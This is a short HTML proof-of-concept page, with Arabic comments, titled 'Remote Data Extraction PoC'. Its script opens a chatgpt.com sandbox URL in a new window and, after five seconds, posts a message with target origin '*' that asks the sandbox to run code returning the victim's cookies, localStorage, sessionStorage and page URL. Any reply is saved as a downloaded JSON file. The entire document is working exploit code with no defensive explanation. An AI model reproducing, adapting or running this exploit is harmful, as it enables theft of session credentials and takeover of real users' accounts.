<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Remote Sandbox PoC</title>
</head>
<body>
  <h2>🚀 Remote Data Extraction PoC</h2>
  <button id="launchBtn">Open & Exploit Sandbox</button>

  <script>
    let victimWin;

    function launch() {
      console.log("🚀 Remote PoC started...");

      // 🔗 حط هنا رابط sandbox الحقيقي (اللي يطلع لك من preview)
      const sandboxUrl = "https://chatgpt.com/ces/v1/t";

      victimWin = window.open(sandboxUrl, "victim", "width=900,height=700");

      window.addEventListener("message", (evt) => {
        console.log("📩 Got message:", evt.origin, evt.data);

        // حفظ البيانات وتنزيلها كملف JSON
        const blob = new Blob([JSON.stringify(evt.data, null, 2)], {type: "application/json"});
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = "sandbox_data_" + Date.now() + ".json";
        a.click();
        console.log("💾 File download triggered.");
      });

      // انتظر شوية ثم ابعث payload
      setTimeout(() => {
        console.log("📡 Sending exploit payload to sandbox...");
        victimWin.postMessage(
          ["CALL", "runUserCode", ["return {cookies: document.cookie, localStorage, sessionStorage, url: location.href}"]],
          "*"
        );
      }, 5000);
    }

    // اربط الزر بالدالة بعد تحميل الصفحة
    document.getElementById("launchBtn").addEventListener("click", launch);
  </script>
</body>
</html>
